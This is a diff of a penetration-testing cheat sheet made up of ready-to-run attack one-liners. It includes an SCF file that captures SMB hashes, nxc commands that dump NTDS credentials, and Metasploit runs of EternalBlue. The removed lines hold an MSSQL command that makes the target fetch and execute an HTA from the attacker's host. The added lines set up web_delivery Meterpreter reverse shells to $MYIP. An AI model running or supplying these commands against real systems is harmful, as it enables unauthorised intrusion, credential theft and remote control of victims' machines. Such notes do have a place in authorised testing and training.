@@ -760,22 +760,9 @@ sudo responder -I tun0
 echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\share\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf
 Upload file.scf to SMB share
 
-
-
 +---------- NTDS ----------+
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
 nxc smb $TARGET --use-kcache --ntds --user Administrator
-
-+---------- Metasploit ----------+
-msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
-sessions -i 1
-shares -i C$
-cd programdata
-lcd ~/Uploads
-upload ~/Uploads/windows/nc.exe
-download file.txt
-
-msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
 +---------- Spray Service ----------+
@@ -869,10 +856,6 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC x
 +---------- Impacket ----------+
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
-
-+---------- Metasploit ----------+
-msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
-sessions -i 1
 
 [*] (1521) OracleTNS
 +---------- Find Service Name ----------+
@@ -1227,6 +1210,13 @@ powershell -c "Set-ExecutionPolicy unrestricted"
 services.msc
 
 [*] Meterpreter
++---------- Initial Shell ----------+
+64-Bit
+msfconsole -q -x 'use exploit/multi/script/web_delivery; set LPORT 8787; set LHOST $MYIP; set TARGET PSH; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+
+32-Bit
+msfconsole -q -x 'use exploit/multi/script/web_delivery; set LPORT 8787; set LHOST $MYIP; set TARGET PSH; set PAYLOAD windows/meterpreter/reverse_tcp; run'
+
 +---------- Load Modules ----------+
 load kiwi
 load exploit
